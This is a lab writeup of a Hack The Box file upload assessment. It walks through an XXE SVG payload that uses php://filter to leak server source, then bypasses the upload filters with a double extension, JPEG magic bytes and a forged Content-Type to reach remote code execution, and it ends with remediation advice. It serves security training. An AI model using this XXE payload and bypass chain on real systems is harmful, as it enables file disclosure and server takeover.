# HTB File Upload Attacks — Skill Assessment Writeup

A step-by-step writeup of how I solved the **File Upload Attacks** Skill Assessment on Hack The Box — chaining client-side bypass analysis, XXE-based source code disclosure, and filter logic flaws (blacklist, regex, and MIME/magic-byte checks) to achieve remote code execution.

---

## Tools Used
- Browser Developer Tools
- Burp Suite (intercepting proxy)
- Manual SVG/XXE payload crafting

---

## Step 1 — Endpoint Discovery and Client-Side Inspection

The application exposes a file upload form on the `/contact` endpoint.

Inspecting the HTML input element revealed a client-side restriction:

```html
<input type="file" accept=".jpg,.jpeg,.png">
```

Client-side restrictions like `accept` only run in the browser and provide no real security — they can be trivially bypassed by intercepting and modifying the request before it reaches the server (e.g. via Burp Suite).

**Initial test:** Uploading a backend script (`.php`) directly returned an error stating only image files are accepted — confirming **server-side validation** is also in place.

<details>
<summary>script.js (paste source here)</summary>

```javascript
function checkFile(File) {
  var file = File.files[0];
  var filename = file.name;
  var extension = filename.split('.').pop();

  if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    $('#upload_message').text("Only images are allowed");
    File.form.reset();
  } else {
    $("#inputGroupFile01").text(filename);
  }
}

$(document).ready(function () {
  $("#upload").click(function (event) {
    event.preventDefault();
    var fd = new FormData();
    var files = $('#uploadFile')[0].files[0];
    fd.append('uploadFile', files);

    if (!files) {
      $('#upload_message').text("Please select a file");
    } else {
      $.ajax({
        url: '/contact/upload.php',
        type: 'post',
        data: fd,
        contentType: false,
        processData: false,
        success: function (response) {
          if (response.trim() != '') {
            $("#upload_message").html(response);
          } else {
            window.location.reload();
          }
        },
      });
    }
  });
});
```

</details>

---

## Step 2 — Source Code Disclosure via XXE

SVG files are XML-based images. If the backend's image parser processes external entity declarations within that XML, it becomes vulnerable to **XML External Entity (XXE) injection**.

I crafted a malicious SVG using an XXE payload with the PHP stream wrapper `php://filter/read=convert.base64-encode/resource=upload.php`, forcing the parser to read the server-side `upload.php` file and return its base64-encoded contents inside the rendered response.

**Example XXE payload structure:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=upload.php">
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="50">&xxe;</text>
</svg>
```

Uploading this SVG and viewing the rendered output returned the base64-encoded source of `upload.php`. Decoding it exposed the server's full validation logic.

---

## Step 3 — Filter Analysis & Identifying Logic Gaps

<details>
<summary>upload.php (paste decoded source here)</summary>

```php
<?php
require_once('./common-functions.php');

// uploaded files directory
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}
```

</details>

Analysis of the retrieved code revealed **three independent checks, each with an implementation flaw**:

### 1. Incomplete Blacklist
The blacklist blocked standard PHP extensions (`.php`, `.phps`, `.phtml`) but failed to block alternative executable extensions recognized by the web server, such as `.phar`.

### 2. Regex Flaw (Double Extension)
The whitelist regex:

```
/^.+\.[a-z]{2,3}g$/
```

only checks that the filename *ends* with a pattern resembling an image extension (`jpg`, `png`, etc.). A compound filename like:

```
shell.phar.jpg
```

satisfies the regex (it ends in `...jpg`) while still carrying the executable `.phar` extension earlier in the name.

### 3. MIME Verification & Magic Bytes
The backend checked the `Content-Type` header and validated file signatures with `mime_content_type()`. This was bypassed by **prepending valid JPEG magic bytes** to the start of the malicious file:

```
FF D8 FF E0   (JPEG file signature)
```

This satisfied the signature check while the rest of the file retained executable PHP/Phar code.

---

## Step 4 — Upload and File Resolution

**Bypass payload composition:**
- File content: JPEG magic bytes (`FF D8 FF E0`) + PHP/Phar web shell code
- Filename: `shell.phar.jpg`
- `Content-Type`: `image/jpeg`

This combination passed all three checks simultaneously (blacklist, regex whitelist, and MIME/magic byte validation).

**Storage path & naming:** Source code review showed uploaded files are saved to `./user_feedback_submissions/`, prefixed with the date in `ymd` format:

```
YYMMDD_filename
```

**Execution:** Navigating to the resolved path:

```
/contact/user_feedback_submissions/YYMMDD_shell.phar.jpg
```

caused the PHP interpreter to process the embedded `.phar` code, resulting in **remote code execution**.

---

## Summary

| Step | Technique | Outcome |
|------|-----------|---------|
| 1 | Client-side restriction bypass (proxy) | Confirmed server-side validation exists |
| 2 | XXE via SVG + `php://filter` wrapper | Disclosed `upload.php` source code |
| 3 | Blacklist / regex / MIME analysis | Identified 3 independent filter flaws |
| 4 | Combined bypass (magic bytes + double extension) | Achieved remote code execution |

---

## Remediation

- **Strict Whitelisting:** Enforce a strict whitelist of allowed file extensions instead of a blacklist; strip or reject files with multiple/compound extensions.
- **Decouple Storage from Webroot:** Store uploaded files outside the public document root, or serve them via object storage with no execution privileges.
- **Filename Normalization:** Automatically rename uploaded files using random identifiers (e.g., UUIDs) to prevent extension trickery and path manipulation.
- **Disable External Entities:** Configure the XML parser to disable DTD processing and external entity resolution to prevent XXE.
- **Defense in Depth:** Validate file type at multiple independent layers (extension, MIME, magic bytes, and content re-encoding/sanitization) rather than relying on any single check.

---

*Writeup by Gupteswar Achary — Hack The Box File Upload Attacks Skill Assessment*